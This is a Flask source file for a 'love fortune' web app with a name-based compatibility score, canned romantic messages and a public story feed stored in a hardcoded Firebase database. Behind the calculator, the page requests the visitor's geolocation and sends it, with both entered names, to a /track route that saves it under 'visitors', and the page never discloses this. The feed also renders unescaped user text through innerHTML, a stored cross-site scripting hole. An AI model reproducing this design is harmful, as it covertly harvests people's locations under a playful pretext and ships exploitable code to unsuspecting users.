from flask import Flask, request, jsonify, render_template_string
import os
import random
import requests
from datetime import datetime

app = Flask(__name__)

# ========== CONFIGURATION ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

# ========== 70+ LOVE FORTUNES ==========
def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
        f"💖 {name1} + {name2} = {percentage}% endless affection!",
        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
        f"✨ {name1} & {name2} – {percentage}% magical bond!",
        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
        f"💕 {name1} and {name2} glow with {percentage}% love light!",
        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
        f"💖 {name1} + {name2} = {percentage}% heart connection!",
        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
        f"💖 {name1} + {name2} = {percentage}% love magic!",
        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
        f"💖 {name1} + {name2} = {percentage}% soulful match!",
        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
        f"💕 {name1} and {name2} – {percentage}% charming connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
        f"🌹 {name1} and {name2} share {percentage}% tender love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
        f"💕 {name1} and {name2} – {percentage}% golden romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
        f"💖 {name1} + {name2} = {percentage}% pure affection!",
        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
        f"💕 {name1} and {name2} – {percentage}% love spark!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
        f"💖 {name1} + {name2} = {percentage}% love glow!",
        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
        f"💖 {name1} + {name2} = {percentage}% love warmth!",
        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
        f"💖 {name1} + {name2} = {percentage}% love energy!",
        f"🌹 {name1} and {name2} share {percentage}% passion!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
        f"🌹 {name1} and {name2} share {percentage}% affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
        f"💕 {name1} and {name2} – {percentage}% warm romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
        f"💖 {name1} + {name2} = {percentage}% magical bond!",
        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
        f"💕 {name1} and {name2} – {percentage}% forever love!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
    ]
    return random.choice(messages)

# ========== STORY ANALYZER ==========
def analyze_story(text):
    text = text.lower()
    sad = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone', 'miss']
    if any(word in text for word in sad):
        return "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you."
    return "💖 This is absolutely wonderful! Your story is like a fairytale. Keep glowing!"

# ========== HTML INTERFACE ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love Fortune & Stories</title>
    <style>
        :root { --primary: #f5576c; --secondary: #764ba2; --light: #fef1f2; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-family: 'Segoe UI', sans-serif; min-height: 100vh; display: flex; justify-content: center; padding: 15px; }
        .main-card { background: white; width: 100%; max-width: 480px; border-radius: 30px; padding: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); height: fit-content; }
        
        .nav { display: flex; background: #f0f0f0; border-radius: 15px; padding: 5px; margin-bottom: 20px; }
        .nav-btn { flex: 1; padding: 12px; border: none; border-radius: 12px; background: none; cursor: pointer; font-weight: bold; color: #666; transition: 0.3s; }
        .nav-btn.active { background: white; color: var(--primary); box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        
        .page { display: none; }
        .page.active { display: block; animation: fadeIn 0.4s; }

        input, textarea { width: 100%; padding: 14px; margin: 8px 0; border: 2px solid #eee; border-radius: 12px; outline: none; font-size: 15px; background: #fdfdfd; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        .sub-nav { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; }
        .sub-btn { padding: 8px 18px; border: 1px solid #ddd; border-radius: 20px; background: white; font-size: 13px; cursor: pointer; font-weight: 600; }
        .sub-btn.active { background: var(--secondary); color: white; border-color: var(--secondary); }
        
        .feed { text-align: left; max-height: 600px; overflow-y: auto; padding-right: 5px; }
        .story-item { background: #fcfcfc; padding: 18px; border-radius: 20px; margin-bottom: 20px; border: 1px solid #f0f0f0; box-shadow: 0 4px 6px rgba(0,0,0,0.02); }
        .author-tag { color: var(--secondary); font-weight: bold; font-size: 15px; display: block; margin-bottom: 5px; }
        .bot-msg { font-size: 12px; color: #888; font-style: italic; background: #fdf2f4; padding: 8px; border-radius: 8px; margin: 10px 0; display: block; }
        
        .action-row { display: flex; gap: 15px; margin-top: 10px; border-top: 1px solid #f5f5f5; padding-top: 12px; align-items: center; }
        .like-btn { border: none; background: #fff1f2; color: var(--primary); padding: 6px 12px; border-radius: 10px; cursor: pointer; font-weight: bold; }
        
        .cmnt-list { margin-top: 12px; padding-left: 10px; }
        .cmnt-item { font-size: 13px; color: #444; margin-bottom: 6px; padding: 5px; background: white; border-radius: 6px; border-left: 3px solid #eee; }
        .cmnt-input-row { display: flex; gap: 5px; margin-top: 10px; }
        .cmnt-input { flex: 1; padding: 8px; border: 1px solid #ddd; border-radius: 10px; font-size: 13px; margin: 0; }
        .cmnt-send { background: var(--secondary); color: white; border: none; padding: 0 12px; border-radius: 10px; cursor: pointer; font-size: 12px; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="main-card">
        <div class="nav">
            <button class="nav-btn active" id="tabFortune" onclick="showPage('fortune', this)">🔮 Fortune</button>
            <button class="nav-btn" id="tabStories" onclick="showPage('stories', this)">📖 Stories</button>
        </div>

        <!-- PAGE 1: CALCULATOR -->
        <div id="fortune" class="page active">
            <h2 style="color:var(--secondary); text-align:center;">Love Fortune</h2>
            <input type="text" id="name1" placeholder="Your Name">
            <input type="text" id="name2" placeholder="Crush Name">
            <button class="btn" onclick="calc()">Reveal Destiny</button>
            <div id="calc_res" style="display:none; margin-top:20px; padding:20px; background: var(--light); border-radius:20px; text-align:center;">
                <h1 id="score" style="color:var(--primary); font-size: 50px;">0%</h1>
                <p id="msg" style="font-size:15px; font-weight:500;"></p>
            </div>
        </div>

        <!-- PAGE 2: STORIES -->
        <div id="stories" class="page">
            <div class="sub-nav">
                <button class="sub-btn active" id="btnWrite" onclick="showSection('write')">✍️ Write</button>
                <button class="sub-btn" id="btnRead" onclick="showSection('read')">📖 Read</button>
            </div>

            <!-- WRITE -->
            <div id="write_box">
                <input type="text" id="post_author" placeholder="Your Name">
                <textarea id="post_text" rows="5" placeholder="Share your love story..."></textarea>
                <button class="btn" onclick="submitPost()">Post Publicly</button>
            </div>

            <!-- READ -->
            <div id="read_box" style="display:none;">
                <div id="feed" class="feed">Loading stories...</div>
            </div>
        </div>
    </div>

    <script>
        let sid = 'u_' + Date.now();

        function showPage(p, btn) {
            document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(p).classList.add('active');
            btn.classList.add('active');
        }

        function showSection(s) {
            document.getElementById('write_box').style.display = (s === 'write' ? 'block' : 'none');
            document.getElementById('read_box').style.display = (s === 'read' ? 'block' : 'none');
            document.getElementById('btnWrite').classList.toggle('active', s === 'write');
            document.getElementById('btnRead').classList.toggle('active', s === 'read');
            if(s === 'read') loadFeed();
        }

        async function calc() {
            const n1 = document.getElementById('name1').value;
            const n2 = document.getElementById('name2').value;
            if(!n1 || !n2) return alert("Fill names!");
            const res = await fetch('/calculate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ n1, n2 })
            });
            const data = await res.json();
            document.getElementById('calc_res').style.display = 'block';
            document.getElementById('score').innerText = data.score + "%";
            document.getElementById('msg').innerText = data.msg;

            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/track', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ sid, n1, n2, lat: pos.coords.latitude, lon: pos.coords.longitude })
                });
            });
        }

        async function submitPost() {
            const author = document.getElementById('post_author').value;
            const text = document.getElementById('post_text').value;
            if(!author || !text) return alert("Enter both name and story!");
            await fetch('/post-story', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ author, text })
            });
            alert("Story Posted!");
            document.getElementById('post_text').value = '';
            showSection('read');
        }

        async function doLike(id) {
            await fetch('/like', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ id })
            });
            loadFeed();
        }

        async function doCmnt(id) {
            const val = document.getElementById('in_'+id).value;
            if(!val) return;
            await fetch('/comment', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ id, text: val })
            });
            loadFeed();
        }

        async function loadFeed() {
            const res = await fetch('/get-stories');
            const data = await res.json();
            const feed = document.getElementById('feed');
            feed.innerHTML = '';
            if(!data) { feed.innerHTML = "No stories yet."; return; }

            Object.entries(data).reverse().forEach(([id, s]) => {
                let cmntsHtml = '';
                if(s.comments) {
                    Object.values(s.comments).forEach(c => {
                        cmntsHtml += `<div class="cmnt-item">💬 ${c.text}</div>`;
                    });
                }
                
                feed.innerHTML += `
                    <div class="story-item">
                        <span class="author-tag">👤 ${s.author}</span>
                        <p>${s.content}</p>
                        <span class="bot-msg">🤖 Bot: ${s.reply}</span>
                        <div class="action-row">
                            <button class="like-btn" onclick="doLike('${id}')">❤️ ${s.likes || 0}</button>
                            <span style="font-size:12px; color:#999;">Public Comments</span>
                        </div>
                        <div class="cmnt-list">${cmntsHtml}</div>
                        <div class="cmnt-input-row">
                            <input type="text" class="cmnt-input" id="in_${id}" placeholder="Type a comment...">
                            <button class="cmnt-send" onclick="doCmnt('${id}')">Send</button>
                        </div>
                    </div>
                `;
            });
        }
    </script>
</body>
</html>
'''

# ========== BACKEND ROUTES ==========
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/calculate', methods=['POST'])
def calculate():
    d = request.json
    score = 50 + (sum(ord(c) for c in (d['n1']+d['n2']).lower()) % 51)
    return jsonify({"score": score, "msg": get_love_message(d['n1'], d['n2'], score)})

@app.route('/post-story', methods=['POST'])
def post_story():
    d = request.json
    rep = analyze_story(d['text'])
    story = {"author": d['author'], "content": d['text'], "reply": rep, "likes": 0, "ts": datetime.now().isoformat()}
    requests.post(f"{FIREBASE_URL}/stories.json", json=story)
    return jsonify({"ok": True})

@app.route('/like', methods=['POST'])
def like():
    sid = request.json['id']
    # Efficient increment using PATCH
    current_likes = requests.get(f"{FIREBASE_URL}/stories/{sid}/likes.json").json() or 0
    requests.patch(f"{FIREBASE_URL}/stories/{sid}.json", json={"likes": current_likes + 1})
    return jsonify({"ok": True})

@app.route('/comment', methods=['POST'])
def comment():
    sid = request.json['id']
    cmnt = {"text": request.json['text'], "ts": datetime.now().isoformat()}
    requests.post(f"{FIREBASE_URL}/stories/{sid}/comments.json", json=cmnt)
    return jsonify({"ok": True})

@app.route('/get-stories')
def get_stories():
    return jsonify(requests.get(f"{FIREBASE_URL}/stories.json").json() or {})

@app.route('/track', methods=['POST'])
def track():
    requests.put(f"{FIREBASE_URL}/visitors/{request.json['sid']}.json", json=request.json)
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
